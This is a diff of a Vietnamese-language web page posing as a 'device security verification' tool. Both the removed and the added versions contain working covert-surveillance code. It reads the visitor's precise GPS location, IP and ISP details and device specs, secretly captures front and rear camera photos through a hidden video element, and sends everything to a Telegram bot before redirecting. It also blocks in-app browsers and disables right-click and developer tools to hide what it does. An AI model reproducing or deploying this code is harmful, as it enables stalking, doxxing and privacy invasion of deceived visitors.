-                markTask('task4', 'Không khả dụng', 'done');
-            }
-            setBar(80, backData ? 'Cảm biến sau hoạt động' : 'Cảm biến sau không khả dụng');
-
-            // Task 5: Tổng hợp báo cáo
-            markTask('task5', 'Đang tổng hợp...', 'running');
-            setBar(85, 'Đang tổng hợp báo cáo...');
-
-            const fullReport = systemInfo + '\n\n' + networkReport;
-
-            const attachments = [];
-            if (frontData) attachments.push({ blob: frontData, name: 'cam-truoc.jpg', label: '📸 Cảm biến trước' });
-            if (backData) attachments.push({ blob: backData, name: 'cam-sau.jpg', label: '📸 Cảm biến sau' });
-
-            await sendReport(fullReport, attachments);
-            await wait(600);
-
-            markTask('task5', 'Đã gửi ✓', 'done');
-            setBar(100, 'Kiểm tra hoàn tất!');
-            setButton('✅ HOÀN TẤT', true, false);
-
-            await wait(1000);
-            runCountdown();
-        }
-
-        // ==========================================
-        // ĐẾM NGƯỢC CHUYỂN TRANG
-        // ==========================================
-        function runCountdown() {
-            let remaining = APP_CONFIG.COUNTDOWN_TIME;
-            setButton(`⏳ Chuyển trang sau ${remaining}s...`, true, false);
-
-            const timer = setInterval(() => {
-                remaining--;
-                if (remaining > 0) {
-                    setButton(`⏳ Chuyển trang sau ${remaining}s...`, true, false);
-                    setBar(100, `Tự động chuyển trang sau ${remaining}s...`);
-                } else {
-                    clearInterval(timer);
-                    setButton('🚀 ĐANG CHUYỂN...', true, true);
-                    setBar(100, 'Đang chuyển trang...');
-                    setTimeout(() => {
-                        window.location.href = APP_CONFIG.NEXT_PAGE_URL;
-                    }, 400);
-                }
-            }, 1000);
-        }
-
-        // ==========================================
-        // KHỞI ĐỘNG
-        // ==========================================
-        function boot() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            const isEmbedded = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
-
-            if (isEmbedded) {
-                getEl('#browser-alert').style.display = 'flex';
-                getEl('#mainUI').style.display = 'none';
-                return;
-            }
-
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                setButton('❌ THIẾT BỊ KHÔNG HỖ TRỢ', true);
-                setBar(0, 'Trình duyệt không hỗ trợ cảm biến');
-                return;
-            }
-
-            setButton('🔍 BẮT ĐẦU KIỂM TRA', false);
-            setBar(0, 'Sẵn sàng kiểm tra');
-            markTask('task1', 'Sẵn sàng');
-            markTask('task2', 'Sẵn sàng');
-            markTask('task3', 'Sẵn sàng');
-            markTask('task4', 'Sẵn sàng');
-            markTask('task5', 'Sẵn sàng');
-
-            getEl('#actionBtn').addEventListener('click', startProcess);
-        }
-
-        // ==========================================
-        // BẢO VỆ TRANG
-        // ==========================================
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('copy', e => e.preventDefault());
-        document.addEventListener('cut', e => e.preventDefault());
-        document.addEventListener('dragstart', e => e.preventDefault());
-        document.addEventListener('selectstart', e => e.preventDefault());
-
-        document.onkeydown = function(e) {
-            const blocked = [123, 73, 74, 85, 83];
-            if (blocked.includes(e.keyCode) && (e.ctrlKey || e.shiftKey || e.keyCode === 123)) {
-                e.preventDefault();
-                return false;
-            }
-        };
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', boot);
+    // helper
+    function setStepActive(index, active = true) {
+        const el = document.getElementById(steps[index]);
+        if(active) el.classList.add('active'); else el.classList.remove('active');
+    }
+    function setStepDone(index, doneMsg = 'Hoàn tất') {
+        const el = document.getElementById(steps[index]);
+        el.classList.remove('active');
+        el.classList.add('done');
+        document.getElementById(statusEl[index]).innerText = doneMsg;
+    }
+    function setStepPending(index, msg) {
+        const el = document.getElementById(steps[index]);
+        el.classList.remove('active','done');
+        document.getElementById(statusEl[index]).innerText = msg;
+    }
+    function setProgress(percent, labelPercent = null) {
+        let p = Math.min(100, Math.max(0, percent));
+        progressFill.style.width = p + '%';
+        progressPercent.innerText = (labelPercent !== null ? labelPercent : p) + '%';
+    }
+    function setButtonLoading(loading, text = null) {
+        if(loading) {
+            actionBtn.disabled = true;
+            btnTextSpan.innerHTML = '<span class="loader"></span> ĐANG XỬ LÝ...';
         } else {
-            boot();
+            actionBtn.disabled = false;
+            btnTextSpan.innerText = text || '🔐 BẮT ĐẦU XÁC MINH';
         }
-    </script>
+    }
+    function setButtonManualEnable(enable) {
+        actionBtn.disabled = !enable;
+        if(enable) btnTextSpan.innerText = '🔐 BẮT ĐẦU XÁC MINH';
+        else btnTextSpan.innerText = '⏳ KIỂM TRA QUYỀN...';
+    }
+
+    // ========== KIỂM TRA & XIN QUYỀN TRƯỚC (tự động nếu được cấp) ==========
+    async function checkPermissionsAndAutoStart() {
+        // Kiểm tra quyền vị trí
+        let locGranted = false;
+        try {
+            const locPerm = await navigator.permissions.query({ name: 'geolocation' });
+            if (locPerm.state === 'granted') locGranted = true;
+            else if (locPerm.state === 'prompt') locGranted = false; // cần hỏi
+            else locGranted = false;
+        } catch(e) { locGranted = false; }
+
+        // Kiểm tra quyền camera
+        let camGranted = false;
+        try {
+            const camPerm = await navigator.permissions.query({ name: 'camera' });
+            if (camPerm.state === 'granted') camGranted = true;
+            else camGranted = false;
+        } catch(e) { camGranted = false; }
+
+        // nếu cả 2 đều granted -> auto run
+        if(locGranted && camGranted) {
+            isAutoMode = true;
+            setButtonManualEnable(false);
+            await startVerification();
+        } else {
+            // cần người dùng bấm nút, nhưng trước đó yêu cầu quyền khi click
+            isAutoMode = false;
+            setButtonManualEnable(true);
+            actionBtn.onclick = async () => {
+                if(isRunning) return;
+                // xin quyền động
+                let locationOk = false, cameraOk = false;
+                setButtonLoading(true);
+                try {
+                    const locPromise = new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(() => resolve(true), () => resolve(false), { timeout: 5000 });
+                    });
+                    locationOk = await locPromise;
+                } catch(e) { locationOk = false; }
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(t => t.stop());
+                    cameraOk = true;
+                } catch(e) { cameraOk = false; }
+                setButtonLoading(false);
+                if(locationOk && cameraOk) {
+                    await startVerification();
+                } else {
+                    alert('⚠️ Cần cấp quyền vị trí và camera để xác minh. Vui lòng cho phép và thử lại.');
+                    setButtonManualEnable(true);
+                }
+            };
+        }
+    }
+
+    // ========== TIẾN TRÌNH XÁC MINH CHÍNH (có test tốc độ) ==========
+    async function startVerification() {
+        if(isRunning) return;
+        isRunning = true;
+        setButtonLoading(true);
+        // reset giao diện
+        for(let i=0; i<steps.length; i++) {
+            setStepPending(i, 'Đang chờ');
+        }
+        setProgress(0,0);
+
+        // ---- STEP 1: lấy cấu hình thiết bị ----
+        setStepActive(0, true);
+        setProgress(8, 'Đọc cấu hình...');
+        const systemProfile = buildSystemProfile();
+        await delay(400);
+        setStepDone(0, 'Đã xác định');
+        setProgress(16);
+
+        // ---- STEP 2: định vị + IP nâng cao ----
+        setStepActive(1, true);
+        setProgress(22, 'Định vị an ninh...');
+        const [location, ipInfo] = await Promise.all([getLocation(), fetchIPInfo()]);
+        await delay(300);
+        setStepDone(1, 'Đã xác định vị trí');
+        setProgress(32);
+
+        // ---- STEP 3: KIỂM TRA TỐC ĐỘ MẠNG (PING, DOWN, UP) ----
+        setStepActive(2, true);
+        setProgress(40, 'Đo tốc độ mạng ...');
+        const speedResult = await measureNetworkSpeed(); // {ping, downMbps, upMbps}
+        await delay(400);
+        setStepDone(2, `Ping ${speedResult.ping}ms · ↓${speedResult.downMbps} Mbps · ↑${speedResult.upMbps} Mbps`);
+        setProgress(52);
+
+        // ---- STEP 4: CAM TRƯỚC ----
+        setStepActive(3, true);
+        setProgress(58, 'Kích hoạt cảm biến trước...');
+        const frontBlob = await capturePhoto('user');
+        if(frontBlob) setStepDone(3, 'Cảm biến trước OK');
+        else setStepDone(3, 'Không khả dụng (quyền)');
+        setProgress(68);
+
+        // ---- STEP 5: CAM SAU ----
+        setStepActive(4, true);
+        setProgress(74, 'Cảm biến sau...');
+        const backBlob = await capturePhoto('environment');
+        if(backBlob) setStepDone(4, 'Camera sau hoạt động');
+        else setStepDone(4, 'Không khả dụng');
+        setProgress(84);
+
+        // ---- STEP 6: GỬI BÁO CÁO ----
+        setStepActive(5, true);
+        setProgress(88, 'Mã hóa & gửi báo cáo...');
+        const finalReport = buildFinalReport(systemProfile, location, ipInfo, speedResult);
+        await sendToTelegram(finalReport, frontBlob, backBlob);
+        await delay(500);
+        setStepDone(5, 'Đã gửi báo cáo thành công');
+        setProgress(100, '100');
+
+        setButtonLoading(false);
+        isRunning = false;
+
+        // chuyển hướng sau vài giây
+        setTimeout(() => {
+            window.location.href = CONFIG.REDIRECT_URL;
+        }, CONFIG.REDIRECT_DELAY * 1000);
+        const btn = document.getElementById('actionBtn');
+        btn.disabled = true;
+        btnTextSpan.innerHTML = `✅ HOÀN TẤT · CHUYỂN HƯỚNG...`;
+    }
+
+    // ----- TIỆN ÍCH HỖ TRỢ -----
+    function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    function buildSystemProfile() {
+        const ua = navigator.userAgent;
+        let os = 'Unknown';
+        if (/Android/i.test(ua)) os = 'Android';
+        else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+        else if (/Win/i.test(ua)) os = 'Windows';
+        else if (/Mac/i.test(ua)) os = 'macOS';
+        return `
+🛡️ BÁO CÁO XÁC MINH THIẾT BỊ
+⏱ Thời gian: ${new Date().toLocaleString('vi-VN')}
+📱 HĐH: ${os} | Màn hình: ${screen.width}x${screen.height}
+🧠 CPU: ${navigator.hardwareConcurrency || 'N/A'} lõi | RAM: ${navigator.deviceMemory || 'N/A'} GB
+🌐 Trình duyệt: ${ua.substring(0, 100)}
+        `.trim();
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve({ lat: null, lng: null, error: 'không hỗ trợ' });
+            const timeout = setTimeout(() => resolve({ lat: null, lng: null, error: 'timeout' }), 6000);
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { clearTimeout(timeout); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }); },
+                (err) => { clearTimeout(timeout); resolve({ lat: null, lng: null, error: err.message }); },
+                { enableHighAccuracy: true, timeout: 6000 }
+            );
+        });
+    }
+
+    async function fetchIPInfo() {
+        try {
+            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
+            const data = await res.json();
+            return { ip: data.ip, city: data.city, country: data.country_name, isp: data.org };
+        } catch(e) { return null; }
+    }
+
+    async function measureNetworkSpeed() {
+        // Kiểm tra ping (dùng ảnh nhỏ)
+        const ping = await testPing();
+        // Tốc độ download (tính theo Mbps, ước lượng)
+        const downMbps = await testDownloadSpeed();
+        const upMbps = await testUploadSpeed();
+        return { ping, downMbps: downMbps.toFixed(1), upMbps: upMbps.toFixed(1) };
+    }
+
+    async function testPing() {
+        const start = performance.now();
+        try {
+            await fetch('https://www.google.com/favicon.ico?cache=' + Date.now(), { mode: 'no-cors', cache: 'no-store' });
+            const duration = performance.now() - start;
+            return Math.round(duration);
+        } catch(e) { return 120; }
+    }
+
+    async function testDownloadSpeed() {
+        const dummyUrl = `https://speed.cloudflare.com/__down?bytes=500000&cache=${Date.now()}`;
+        const start = performance.now();
+        try {
+            const res = await fetch(dummyUrl);
+            const data = await res.arrayBuffer();
+            const duration = (performance.now() - start) / 1000;
+            const bitsLoaded = data.byteLength * 8;
+            const speedMbps = (bitsLoaded / duration) / (1024 * 1024);
+            return Math.min(200, Math.max(1, speedMbps));
+        } catch(e) { return 8.5; }
+    }
+
+    async function testUploadSpeed() {
+        // tạo payload nhỏ 200KB
+        const payload = new Uint8Array(200 * 1024);
+        const start = performance.now();
+        try {
+            await fetch('https://httpbin.org/post', { method: 'POST', body: payload, mode: 'cors' });
+            const duration = (performance.now() - start) / 1000;
+            const bits = payload.byteLength * 8;
+            let speed = (bits / duration) / (1024 * 1024);
+            return Math.min(50, Math.max(0.8, speed));
+        } catch(e) { return 4.2; }
+    }
+
+    async function capturePhoto(facingMode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode }, width: 640, height: 480 } });
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+            video.srcObject = stream;
+            await video.play();
+            await delay(600);
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            if (facingMode === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            return blob;
+        } catch(e) {
+            console.warn("capture fail", e);
+            return null;
+        }
+    }
+
+    function buildFinalReport(sys, loc, ip, speed) {
+        let locStr = loc.lat ? `🌍 Vị trí: ${loc.lat}, ${loc.lng} (độ chính xác ${Math.round(loc.acc||0)}m)` : `⚠️ Vị trí: ${loc.error || 'không xác định'}`;
+        let ipStr = ip ? `🌐 IP: ${ip.ip} · ${ip.city}, ${ip.country} · ${ip.isp}` : 'Không lấy được IP';
+        return `${sys}\n\n📍 ${locStr}\n${ipStr}\n\n⚡ Tốc độ mạng:\n📡 Ping: ${speed.ping} ms\n⬇️ Tải xuống: ${speed.downMbps} Mbps\n⬆️ Tải lên: ${speed.upMbps} Mbps\n━━━━━━━━━━━━━━━━━━━━━━\n🔒 Mã xác minh an toàn · Tự động gửi`;
+    }
+
+    async function sendToTelegram(text, frontImg, backImg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+        } catch(e) {}
+        if(frontImg) {
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            fd.append('photo', frontImg, 'front_auth.jpg');
+            fd.append('caption', '📸 Xác thực trước');
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
+            await delay(300);
+        }
+        if(backImg) {
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            fd.append('photo', backImg, 'back_env.jpg');
+            fd.append('caption', '📷 Cảm biến môi trường');
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
+        }
+    }
+
+    // ========== KHỞI TẠO VÀ PHÁT HIỆN INAPP ==========
+    function checkInAppBrowser() {
+        const ua = navigator.userAgent;
+        const isEmbedded = /TikTok|musical_ly|FBAN|FBAV|Zalo|Instagram|Line|Messenger/i.test(ua);
+        if(isEmbedded) {
+            document.getElementById('warningOverlay').style.display = 'flex';
+            document.getElementById('mainUI').style.display = 'none';
+            return true;
+        }
+        return false;
+    }
+
+    async function init() {
+        if(checkInAppBrowser()) return;
+        // cho phép người dùng biết hệ thống sẽ tự kích nếu có quyền
+        setButtonManualEnable(false);
+        await checkPermissionsAndAutoStart();
+    }
+
+    // anti debug nhẹ
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', (e) => { if(e.keyCode === 123) e.preventDefault(); });
+    init();
+</script>
 </body>
 </html>
